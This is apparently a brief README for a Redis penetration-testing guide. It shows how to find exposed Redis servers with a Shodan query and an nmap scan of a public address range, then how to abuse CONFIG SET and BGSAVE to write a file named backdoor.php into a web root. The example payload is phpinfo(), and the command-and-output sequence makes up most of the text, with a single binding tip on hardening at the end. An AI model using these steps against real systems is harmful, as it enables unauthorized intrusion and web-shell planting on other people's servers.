# Redisturb
## *Redis.io* Penetration Testing 
![GitHub Logo](/Redis_Logo.png)
##### Intro

*Redis.io* is an open source in-memory database developed to store volatile data like messages, cache, cookie, etc.

I beg you to read [url:redis.io/security](http://redis.io/topics/security) if you have any intention to setup *Redis.io* in production mode.

##### Discover misconfigured *Redis.io* using *Shodan* and *Nmap*

*Shodan* give us a powerful tool to find several misconfigured servers.

` { product:"Redis key-value store", port:"6379" } `

*Nmap* is useful to quickly find open ports.

`nmap -p 6379 -n --open 199.233.232.0/24`

##### Upload malicious file
Requirement : access to CONFIG and BGSAVE or SAVE
```
localhost:6379> config set dir /var/www/html
OK
localhost:6379> config get dir
1) "dir"
2) "/var/www/html"
- - - - -
localhost:6379> config set dbfilename backdoor.php
OK
localhost:6379> config get dbfilename
1) "dbfilename"
2) "backdoor.php"
- - - - -
localhost:6379> set cmd "<?php phpinfo(); ?>"
OK
localhost:6379> bgsave
Background saving started
- - - - -
-rw-r--r-- 1 redis redis 45 Sep 19 17:01 backdoor.php
```

#### Security Best Practices
Add to **redis.conf**

`bind 127.0.0.1`

Allow access only from loopback (implied that the application that needs *Redis.io* running on the same host).
